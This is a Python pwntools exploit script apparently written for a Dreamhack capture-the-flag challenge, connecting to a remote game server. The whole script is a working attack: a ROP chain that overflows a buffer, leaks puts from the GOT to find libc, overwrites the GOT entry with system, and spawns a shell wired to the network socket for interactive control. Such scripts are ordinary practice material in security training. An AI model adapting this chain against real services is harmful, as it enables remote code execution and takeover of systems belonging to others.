from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 9241
r = remote(HOST, PORT)

pop_rcx_rdx_rsi_rdi = 0x401396
puts_got = 0x404020
puts_plt = 0x401180
send_plt = 0x4011c0
read_plt = 0x401200
addr = 0x4040e0

sh = b'sh <&4 >&4 2>&4'

payload = flat([
    b'/quit\n'.ljust(0x330,b'\x00'),
    4,
    0,
    0,
    pop_rcx_rdx_rsi_rdi,
    0,
    8,
    puts_got,
    4,
    send_plt
])


payload += flat([
    pop_rcx_rdx_rsi_rdi,
    0,
    8,
    puts_got,
    4,
    read_plt
])

payload += flat([
    pop_rcx_rdx_rsi_rdi,
    0,
    len(sh),
    addr,
    4,
    read_plt
])

payload += flat([
    pop_rcx_rdx_rsi_rdi,
    0,
    0,
    0,
    addr,
    puts_plt
])

r.send(payload)

r.recvuntil(b'!\n')
libc = u64(r.recv(8))-0x80e50
system = libc + 0x50d70

r.send(p64(system))
r.send(sh)

r.interactive()